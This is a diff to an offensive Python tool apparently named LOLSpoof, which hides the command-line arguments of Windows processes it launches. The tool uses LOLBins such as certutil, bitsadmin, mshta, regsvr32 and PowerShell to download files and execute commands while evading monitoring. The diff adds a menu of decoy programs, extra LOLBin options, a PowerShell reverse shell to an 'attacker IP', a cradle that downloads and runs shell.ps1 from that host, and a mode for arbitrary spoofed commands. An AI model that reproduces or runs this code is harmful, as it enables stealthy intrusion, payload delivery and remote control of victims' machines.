@@ -27,11 +27,11 @@ help_msg = """
     !download    -> Download a file using a LOLBin
     !execute     -> Execute a command using a LOLBin
     !spawn       -> Spawn a reverse shell using a LOLBin
+    !custom      -> Execute a custom command
 """
 
 prompt = "[LOLSpoof] > "
 
-# Windows API structures and constants
 class STARTUPINFO(ctypes.Structure):
     _fields_ = [('cb', wintypes.DWORD),
                 ('lpReserved', wintypes.LPWSTR),
@@ -66,7 +66,6 @@ class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                 ('UniqueProcessId', wintypes.ULONG),
                 ('InheritedFromUniqueProcessId', wintypes.ULONG)]
 
-# Function prototypes
 CreateProcessW = ctypes.windll.kernel32.CreateProcessW
 CreateProcessW.argtypes = [wintypes.LPWSTR, wintypes.LPWSTR, ctypes.c_void_p, ctypes.c_void_p,
                            wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPWSTR,
@@ -96,10 +95,9 @@ WaitForSingleObject.restype = wintypes.DWORD
 def onexit():
     exit(0)
 
-def execute_spoofed_lolbin(real_cmdline):
-    binary = real_cmdline.split(" ")[0]
-    args_len = len(real_cmdline) - len(binary)
-    spoofed_cmdline = binary + ' ' * args_len
+def execute_spoofed_lolbin(program, real_cmdline):
+    args_len = len(real_cmdline) - len(program)
+    spoofed_cmdline = program + ' ' * args_len
     real_cmdline = real_cmdline.encode('utf-16le')
     spoofed_cmdline = spoofed_cmdline.encode('utf-16le')
 
@@ -136,6 +134,25 @@ def execute_spoofed_lolbin(real_cmdline):
     WaitForSingleObject(pi.hThread, -1)
     return True
 
+def get_spoofing_program():
+    print("Choose a program to use for spoofing:")
+    print("1. notepad.exe")
+    print("2. calc.exe")
+    print("3. cmd.exe")
+    print("4. powershell.exe")
+    choice = input("[1/2/3/4]> ").strip()
+    if choice == "1":
+        return "notepad.exe"
+    elif choice == "2":
+        return "calc.exe"
+    elif choice == "3":
+        return "cmd.exe"
+    elif choice == "4":
+        return "powershell.exe"
+    else:
+        print("Invalid choice, using default (notepad.exe).")
+        return "notepad.exe"
+
 def handle_special_command(cmd):
     if cmd == "!exit":
         onexit()
@@ -144,46 +161,80 @@ def handle_special_command(cmd):
     elif cmd == "!help":
         print(help_msg)
     elif cmd == "!download":
+        program = get_spoofing_program()
         print("Choose LOLBin for download:")
         print("1. Certutil")
         print("2. Bitsadmin")
         print("3. PowerShell")
-        choice = input("[1/2/3]> ").strip()
+        print("4. BITS PowerShell Module")
+        choice = input("[1/2/3/4]> ").strip()
         url = input("Enter URL to download: ").strip()
         dest = input("Enter destination file path: ").strip()
+        if not url or not dest:
+            print("URL and destination path cannot be empty.")
+            return
         if choice == "1":
-            execute_spoofed_lolbin(f"certutil -urlcache -split -f {url} {dest}")
+            execute_spoofed_lolbin(program, f"certutil -urlcache -split -f {url} {dest}")
         elif choice == "2":
-            execute_spoofed_lolbin(f"bitsadmin /transfer mydownloadjob /download /priority high {url} {dest}")
+            execute_spoofed_lolbin(program, f"bitsadmin /transfer mydownloadjob /download /priority high {url} {dest}")
         elif choice == "3":
-            execute_spoofed_lolbin(f"powershell -Command Invoke-WebRequest -Uri {url} -OutFile {dest}")
+            execute_spoofed_lolbin(program, f"powershell -Command Invoke-WebRequest -Uri {url} -OutFile {dest}")
+        elif choice == "4":
+            execute_spoofed_lolbin(program, f"powershell -Command Start-BitsTransfer -Source {url} -Destination {dest}")
         else:
             print("Invalid choice")
     elif cmd == "!execute":
+        program = get_spoofing_program()
         print("Choose LOLBin for command execution:")
         print("1. Mshta")
         print("2. Regsvr32")
-        choice = input("[1/2]> ").strip()
+        print("3. Rundll32")
+        print("4. Powershell")
+        choice = input("[1/2/3/4]> ").strip()
         cmd_to_execute = input("Enter command to execute: ").strip()
+        if not cmd_to_execute:
+            print("Command to execute cannot be empty.")
+            return
         if choice == "1":
-            execute_spoofed_lolbin(f"mshta {cmd_to_execute}")
+            execute_spoofed_lolbin(program, f"mshta {cmd_to_execute}")
         elif choice == "2":
-            execute_spoofed_lolbin(f"regsvr32 /s /n /u /i:{cmd_to_execute} scrobj.dll")
+            execute_spoofed_lolbin(program, f"regsvr32 /s /n /u /i:{cmd_to_execute} scrobj.dll")
+        elif choice == "3":
+            execute_spoofed_lolbin(program, f"rundll32 {cmd_to_execute}")
+        elif choice == "4":
+            execute_spoofed_lolbin(program, f"powershell -Command {cmd_to_execute}")
         else:
             print("Invalid choice")
     elif cmd == "!spawn":
+        program = get_spoofing_program()
         print("Choose LOLBin to spawn a reverse shell:")
         print("1. PowerShell")
         print("2. Mshta")
-        choice = input("[1/2]> ").strip()
+        print("3. Cmd")
+        print("4. Wscript")
+        choice = input("[1/2/3/4]> ").strip()
         lhost = input("Enter the local host (attacker IP): ").strip()
         lport = input("Enter the local port: ").strip()
+        if not lhost or not lport:
+            print("Local host and port cannot be empty.")
+            return
         if choice == "1":
-            execute_spoofed_lolbin(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
+            execute_spoofed_lolbin(program, f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
         elif choice == "2":
-            execute_spoofed_lolbin(f"mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\",0)(window.close)")
+            execute_spoofed_lolbin(program, f"mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\",0)(window.close)")
+        elif choice == "3":
+            execute_spoofed_lolbin(program, f"cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1') | powershell -noprofile")
+        elif choice == "4":
+            execute_spoofed_lolbin(program, f"wscript //E:vbscript //B {lhost}:{lport}")
         else:
             print("Invalid choice")
+    elif cmd == "!custom":
+        program = get_spoofing_program()
+        custom_cmd = input("Enter the custom command: ").strip()
+        if not custom_cmd:
+            print("Custom command cannot be empty.")
+            return
+        execute_spoofed_lolbin(program, custom_cmd)
     else:
         print(f"Could not parse command: {cmd}")
 
@@ -205,5 +256,6 @@ if __name__ == "__main__":
         cmdline_seq[0] = binary
         cmdline = " ".join(cmdline_seq)
 
-        if not execute_spoofed_lolbin(cmdline):
+        program = get_spoofing_program()
+        if not execute_spoofed_lolbin(program, cmdline):
             print(f"Could not spoof binary: {cmdline_seq[0]}")
